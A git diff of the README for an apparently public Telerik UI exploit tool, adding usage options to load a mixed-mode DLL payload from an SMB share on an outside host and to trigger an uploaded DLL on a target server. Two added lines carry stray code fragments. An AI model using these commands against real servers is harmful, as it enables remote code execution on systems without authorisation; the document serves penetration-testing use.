@@ -22,7 +22,8 @@ My other Telerik UI exploit (for CVE-2017-9248) will probably also be of interes
 ## To do
 - [x] Missing HMAC functionality for later versions.
 - [x] Ability to specify custom key.
-- [ ] Command line argument for execution of a mixed mode dll (in the meantime use the example .NET deserialisation payload provided below).
+- [x] Command line argument for execution of a mixed mode dll (in the meantime use the example .NET deserialisation payload provided below).
+- [x] Command line arguments for testing capability of and loading remotely (SMB) hosted mixed mode dlls 
 - [ ] Separate utility for testing mixed mode dll.
 - [x] Provide source code/compilation instructions for mixed mode dll.
 - [ ] Brute force versions.
@@ -59,6 +60,9 @@ Generate custom payload POST data : -c partA partB
 Send custom payload:                -C partA partB url [proxy]
 
 Check remote SMB payload capability -r lhost url [proxy]
+
+Load remote SMB payload             -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
+Trigger local uploaded dll payload  -L c:/users/public/documents/mixed_mode_assembly.dll url [proxy]\n\n" +
 
 Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau
 Example Version:           2016.2.504
